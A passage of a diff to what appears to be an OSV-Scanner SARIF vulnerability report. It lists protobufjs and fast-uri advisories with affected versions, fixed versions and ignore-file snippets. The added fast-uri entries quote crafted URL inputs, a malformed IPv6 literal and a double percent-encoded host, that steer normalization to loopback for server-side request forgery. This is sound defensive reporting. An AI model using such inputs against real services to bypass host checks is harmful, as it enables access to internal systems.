GHSA-xxjr-mmjv-4gpg | lodash-amd | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash | 4.17.23 |\n| GHSA-xxjr-mmjv-4gpg | lodash-es | 4.17.23 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2025-13465\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
               },
               "id": "CVE-2025-13465",
               "name": "CVE-2025-13465",
@@ -7178,8 +7658,8 @@
                 "text": "## Summary\n\nprotobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named `hasOwnProperty`, field or oneof names such as `$type` when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is `rpcCall`.\n\nWhen affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.\n\n## Impact\n\nAn attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.\n\nApplications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.\n\nThe issue is not known to allow code execution by itself.\n\n## Preconditions\n\n* The application must use an affected protobufjs version.\n* The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:\n  * a field named `hasOwnProperty`,\n  * a field or oneof named `$type` through protobufjs JSON/reflection descriptor input,\n  * or a service method whose generated helper name is `rpcCall`.\n* The application must reach the affected API path for that name: required-field decode post-checks, `verify`, or `toObject` for `hasOwnProperty`; reflected message JSON serialization for `$type`; or protobufjs RPC service invocation for `rpcCall`.\n\n## Workarounds\n\nDo not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.\n\nApplications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path."
               },
               "help": {
-                "markdown": "**Your dependency is vulnerable to [CVE-2026-54269](https://osv.dev/CVE-2026-54269)**.\n\n## [GHSA-f38q-mgvj-vph7](https://osv.dev/GHSA-f38q-mgvj-vph7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named `hasOwnProperty`, field or oneof names such as `$type` when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is `rpcCall`.\n\u003e \n\u003e When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.\n\u003e \n\u003e Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.\n\u003e \n\u003e The issue is not known to allow code execution by itself.\n\u003e \n\u003e ## Preconditions\n\u003e \n\u003e * The application must use an affected protobufjs version.\n\u003e * The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:\n\u003e   * a field named `hasOwnProperty`,\n\u003e   * a field or oneof named `$type` through protobufjs JSON/reflection descriptor input,\n\u003e   * or a service method whose generated helper name is `rpcCall`.\n\u003e * The application must reach the affected API path for that name: required-field decode post-checks, `verify`, or `toObject` for `hasOwnProperty`; reflected message JSON serialization for `$type`; or protobufjs RPC service invocation for `rpcCall`.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.\n\u003e \n\u003e Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | protobufjs | 6.11.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f38q-mgvj-vph7 | protobufjs | 7.6.3, 8.6.0 |\n| GHSA-f38q-mgvj-vph7 | protobufjs-cli | 1.3.3, 2.5.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-54269\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
-                "text": "**Your dependency is vulnerable to [CVE-2026-54269](https://osv.dev/CVE-2026-54269)**.\n\n## [GHSA-f38q-mgvj-vph7](https://osv.dev/GHSA-f38q-mgvj-vph7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named `hasOwnProperty`, field or oneof names such as `$type` when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is `rpcCall`.\n\u003e \n\u003e When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.\n\u003e \n\u003e Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.\n\u003e \n\u003e The issue is not known to allow code execution by itself.\n\u003e \n\u003e ## Preconditions\n\u003e \n\u003e * The application must use an affected protobufjs version.\n\u003e * The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:\n\u003e   * a field named `hasOwnProperty`,\n\u003e   * a field or oneof named `$type` through protobufjs JSON/reflection descriptor input,\n\u003e   * or a service method whose generated helper name is `rpcCall`.\n\u003e * The application must reach the affected API path for that name: required-field decode post-checks, `verify`, or `toObject` for `hasOwnProperty`; reflected message JSON serialization for `$type`; or protobufjs RPC service invocation for `rpcCall`.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.\n\u003e \n\u003e Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | protobufjs | 6.11.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f38q-mgvj-vph7 | protobufjs | 7.6.3, 8.6.0 |\n| GHSA-f38q-mgvj-vph7 | protobufjs-cli | 1.3.3, 2.5.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-54269\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-54269](https://osv.dev/CVE-2026-54269)**.\n\n## [GHSA-f38q-mgvj-vph7](https://osv.dev/GHSA-f38q-mgvj-vph7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named `hasOwnProperty`, field or oneof names such as `$type` when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is `rpcCall`.\n\u003e \n\u003e When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.\n\u003e \n\u003e Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.\n\u003e \n\u003e The issue is not known to allow code execution by itself.\n\u003e \n\u003e ## Preconditions\n\u003e \n\u003e * The application must use an affected protobufjs version.\n\u003e * The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:\n\u003e   * a field named `hasOwnProperty`,\n\u003e   * a field or oneof named `$type` through protobufjs JSON/reflection descriptor input,\n\u003e   * or a service method whose generated helper name is `rpcCall`.\n\u003e * The application must reach the affected API path for that name: required-field decode post-checks, `verify`, or `toObject` for `hasOwnProperty`; reflected message JSON serialization for `$type`; or protobufjs RPC service invocation for `rpcCall`.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.\n\u003e \n\u003e Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | protobufjs | 6.11.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f38q-mgvj-vph7 | protobufjs-cli | 1.3.3, 2.5.1 |\n| GHSA-f38q-mgvj-vph7 | protobufjs | 7.6.3, 8.6.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-54269\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-54269](https://osv.dev/CVE-2026-54269)**.\n\n## [GHSA-f38q-mgvj-vph7](https://osv.dev/GHSA-f38q-mgvj-vph7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e protobufjs accepted certain schema-derived names that could collide with properties used by protobufjs runtime helpers. The known affected names are fields named `hasOwnProperty`, field or oneof names such as `$type` when loaded through protobufjs JSON/reflection descriptors, and service methods whose generated helper name is `rpcCall`.\n\u003e \n\u003e When affected message or service types were used, protobufjs could read schema-controlled data where it expected an own-property helper, reflected type metadata, or the base RPC helper. This could cause deterministic exceptions or recursive calls in affected decode post-checks, verification, object conversion, reflected JSON serialization, or protobufjs RPC helper invocation.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An attacker who can provide or influence protobuf schemas or protobufjs JSON descriptors may be able to make affected message or service types unusable, resulting in denial of service for the affected processing path.\n\u003e \n\u003e Applications using only trusted schemas are affected only if those schemas contain one of the problematic names and the application reaches the affected API path.\n\u003e \n\u003e The issue is not known to allow code execution by itself.\n\u003e \n\u003e ## Preconditions\n\u003e \n\u003e * The application must use an affected protobufjs version.\n\u003e * The application must load or use a schema or protobufjs JSON descriptor containing one of the problematic names:\n\u003e   * a field named `hasOwnProperty`,\n\u003e   * a field or oneof named `$type` through protobufjs JSON/reflection descriptor input,\n\u003e   * or a service method whose generated helper name is `rpcCall`.\n\u003e * The application must reach the affected API path for that name: required-field decode post-checks, `verify`, or `toObject` for `hasOwnProperty`; reflected message JSON serialization for `$type`; or protobufjs RPC service invocation for `rpcCall`.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e Do not load protobuf schemas or protobufjs JSON descriptors from untrusted sources with affected versions. If untrusted schemas or descriptors must be accepted, validate schema-derived field, oneof, and service method names before loading and reject the problematic names described above.\n\u003e \n\u003e Applications using trusted schemas can avoid the issue by renaming affected fields or service methods, or by avoiding the affected API path.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | protobufjs | 6.11.6 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f38q-mgvj-vph7 | protobufjs-cli | 1.3.3, 2.5.1 |\n| GHSA-f38q-mgvj-vph7 | protobufjs | 7.6.3, 8.6.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-54269\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
               },
               "id": "CVE-2026-54269",
               "name": "CVE-2026-54269",
@@ -7190,6 +7670,30 @@
               "shortDescription": {
                 "markdown": "CVE-2026-54269: protobufjs : Schema-derived names can shadow runtime-significant properties",
                 "text": "CVE-2026-54269: protobufjs : Schema-derived names can shadow runtime-significant properties"
+              }
+            },
+            {
+              "deprecatedIds": [
+                "CVE-2026-75975",
+                "GHSA-f65p-4m7j-42xc"
+              ],
+              "fullDescription": {
+                "markdown": "### Impact\n\n`fast-uri` does not validate the complete RFC 3986 grammar for bracketed IPv6 literals, so a malformed literal with invalid trailing text is silently truncated to a different valid IPv6 address with no error reported. For example, `normalize('http://[::not-valid]/private')` returns `http://[::]/private`, and `[fc00::not-hex]` and `[fe80::not-hex]` collapse to `[fc00::]` and `[fe80::]`. An application that normalizes an untrusted URL before an outbound request, redirect, or host-policy check can be routed to a local or private address such as loopback (`::1`), unique-local, or link-local. Because `parse().error` is unset for these inputs, checking it does not protect the consumer.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. Malformed IPv6 literals are now rejected with a host error instead of being normalized to a valid address.\n\n### Workarounds\n\nReject untrusted URLs whose host is a bracketed IPv6 literal before passing them to `fast-uri`, or route outbound requests against an explicit allowlist of addresses rather than trusting the normalized host.",
+                "text": "### Impact\n\n`fast-uri` does not validate the complete RFC 3986 grammar for bracketed IPv6 literals, so a malformed literal with invalid trailing text is silently truncated to a different valid IPv6 address with no error reported. For example, `normalize('http://[::not-valid]/private')` returns `http://[::]/private`, and `[fc00::not-hex]` and `[fe80::not-hex]` collapse to `[fc00::]` and `[fe80::]`. An application that normalizes an untrusted URL before an outbound request, redirect, or host-policy check can be routed to a local or private address such as loopback (`::1`), unique-local, or link-local. Because `parse().error` is unset for these inputs, checking it does not protect the consumer.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. Malformed IPv6 literals are now rejected with a host error instead of being normalized to a valid address.\n\n### Workarounds\n\nReject untrusted URLs whose host is a bracketed IPv6 literal before passing them to `fast-uri`, or route outbound requests against an explicit allowlist of addresses rather than trusting the normalized host."
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-75975](https://osv.dev/CVE-2026-75975)**.\n\n## [GHSA-f65p-4m7j-42xc](https://osv.dev/GHSA-f65p-4m7j-42xc)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` does not validate the complete RFC 3986 grammar for bracketed IPv6 literals, so a malformed literal with invalid trailing text is silently truncated to a different valid IPv6 address with no error reported. For example, `normalize('http://[::not-valid]/private')` returns `http://[::]/private`, and `[fc00::not-hex]` and `[fe80::not-hex]` collapse to `[fc00::]` and `[fe80::]`. An application that normalizes an untrusted URL before an outbound request, redirect, or host-policy check can be routed to a local or private address such as loopback (`::1`), unique-local, or link-local. Because `parse().error` is unset for these inputs, checking it does not protect the consumer.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Upgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. Malformed IPv6 literals are now rejected with a host error instead of being normalized to a valid address.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Reject untrusted URLs whose host is a bracketed IPv6 literal before passing them to `fast-uri`, or route outbound requests against an explicit allowlist of addresses rather than trusting the normalized host.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f65p-4m7j-42xc | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75975\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75975\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-75975](https://osv.dev/CVE-2026-75975)**.\n\n## [GHSA-f65p-4m7j-42xc](https://osv.dev/GHSA-f65p-4m7j-42xc)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` does not validate the complete RFC 3986 grammar for bracketed IPv6 literals, so a malformed literal with invalid trailing text is silently truncated to a different valid IPv6 address with no error reported. For example, `normalize('http://[::not-valid]/private')` returns `http://[::]/private`, and `[fc00::not-hex]` and `[fe80::not-hex]` collapse to `[fc00::]` and `[fe80::]`. An application that normalizes an untrusted URL before an outbound request, redirect, or host-policy check can be routed to a local or private address such as loopback (`::1`), unique-local, or link-local. Because `parse().error` is unset for these inputs, checking it does not protect the consumer.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Upgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. Malformed IPv6 literals are now rejected with a host error instead of being normalized to a valid address.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Reject untrusted URLs whose host is a bracketed IPv6 literal before passing them to `fast-uri`, or route outbound requests against an explicit allowlist of addresses rather than trusting the normalized host.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-f65p-4m7j-42xc | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75975\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75975\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "CVE-2026-75975",
+              "name": "CVE-2026-75975",
+              "properties": {
+                "security-severity": "7.5"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "CVE-2026-75975: fast-uri vulnerable to server-side request forgery via malformed IPv6 normalization",
+                "text": "CVE-2026-75975: fast-uri vulnerable to server-side request forgery via malformed IPv6 normalization"
               }
             },
             {
@@ -7264,6 +7768,30 @@
               "shortDescription": {
                 "markdown": "CVE-2026-39373: JWCrypto: JWE ZIP decompression bomb",
                 "text": "CVE-2026-39373: JWCrypto: JWE ZIP decompression bomb"
+              }
+            },
+            {
+              "deprecatedIds": [
+                "CVE-2026-75899",
+                "GHSA-fph4-wmhf-6fwf"
+              ],
+              "fullDescription": {
+                "markdown": "### Impact\n\n`fast-uri` decodes a hostname's percent escapes twice in a single `normalize()` or `resolve()` call: once during parsing and again during authority recomposition. A nested percent-encoded host therefore survives the first decode and is turned into a live destination by the second, so `normalize('http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/')` returns `http://localhost/`. Applications that normalize or resolve an untrusted URI before an SSRF check, redirect validation, or host allowlist can be steered to a different destination, including internal addresses such as loopback or a cloud metadata endpoint, than the encoded input appeared to contain. This is an incomplete-fix variant of CVE-2026-6322, whose encoded-authority-delimiter fix introduced the second decode.\n\n### Patches\n\nFixed in `fast-uri` 2.4.5, 3.1.6, and 4.1.3.\n\n### Workarounds\n\nReject untrusted URIs whose host component contains an encoded percent sign (`%25`) before passing them to `normalize()` or `resolve()`.",
+                "text": "### Impact\n\n`fast-uri` decodes a hostname's percent escapes twice in a single `normalize()` or `resolve()` call: once during parsing and again during authority recomposition. A nested percent-encoded host therefore survives the first decode and is turned into a live destination by the second, so `normalize('http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/')` returns `http://localhost/`. Applications that normalize or resolve an untrusted URI before an SSRF check, redirect validation, or host allowlist can be steered to a different destination, including internal addresses such as loopback or a cloud metadata endpoint, than the encoded input appeared to contain. This is an incomplete-fix variant of CVE-2026-6322, whose encoded-authority-delimiter fix introduced the second decode.\n\n### Patches\n\nFixed in `fast-uri` 2.4.5, 3.1.6, and 4.1.3.\n\n### Workarounds\n\nReject untrusted URIs whose host component contains an encoded percent sign (`%25`) before passing them to `normalize()` or `resolve()`."
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-75899](https://osv.dev/CVE-2026-75899)**.\n\n## [GHSA-fph4-wmhf-6fwf](https://osv.dev/GHSA-fph4-wmhf-6fwf)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` decodes a hostname's percent escapes twice in a single `normalize()` or `resolve()` call: once during parsing and again during authority recomposition. A nested percent-encoded host therefore survives the first decode and is turned into a live destination by the second, so `normalize('http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/')` returns `http://localhost/`. Applications that normalize or resolve an untrusted URI before an SSRF check, redirect validation, or host allowlist can be steered to a different destination, including internal addresses such as loopback or a cloud metadata endpoint, than the encoded input appeared to contain. This is an incomplete-fix variant of CVE-2026-6322, whose encoded-authority-delimiter fix introduced the second decode.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Fixed in `fast-uri` 2.4.5, 3.1.6, and 4.1.3.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Reject untrusted URIs whose host component contains an encoded percent sign (`%25`) before passing them to `normalize()` or `resolve()`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-fph4-wmhf-6fwf | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75899\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75899\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-75899](https://osv.dev/CVE-2026-75899)**.\n\n## [GHSA-fph4-wmhf-6fwf](https://osv.dev/GHSA-fph4-wmhf-6fwf)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` decodes a hostname's percent escapes twice in a single `normalize()` or `resolve()` call: once during parsing and again during authority recomposition. A nested percent-encoded host therefore survives the first decode and is turned into a live destination by the second, so `normalize('http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/')` returns `http://localhost/`. Applications that normalize or resolve an untrusted URI before an SSRF check, redirect validation, or host allowlist can be steered to a different destination, including internal addresses such as loopback or a cloud metadata endpoint, than the encoded input appeared to contain. This is an incomplete-fix variant of CVE-2026-6322, whose encoded-authority-delimiter fix introduced the second decode.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Fixed in `fast-uri` 2.4.5, 3.1.6, and 4.1.3.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e Reject untrusted URIs whose host component contains an encoded percent sign (`%25`) before passing them to `normalize()` or `resolve()`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-fph4-wmhf-6fwf | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75899\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-75899\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "CVE-2026-75899",
+              "name": "CVE-2026-75899",
+              "properties": {
+                "security-severity": "7.5"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "CVE-2026-75899: fast-uri vulnerable to server-side request forgery via repeated hostname percent-decoding",
+                "text": "CVE-2026-75899: fast-uri vulnerable to server-side request forgery via repeated hostname percent-decoding"
               }
             },
             {
@@ -7629,6 +8157,30 @@
               "shortDescription": {
                 "markdown": "CVE-2026-48523: PyJWT: Algorithm allow-list bypass when decoding with `PyJWK` / `PyJWKClient` keys",
                 "text": "CVE-2026-48523: PyJWT: Algorithm allow-list bypass when decoding with `PyJWK` / `PyJWKClient` keys"
+              }
+            },
+            {
+              "deprecatedIds": [
+                "CVE-2026-76172",
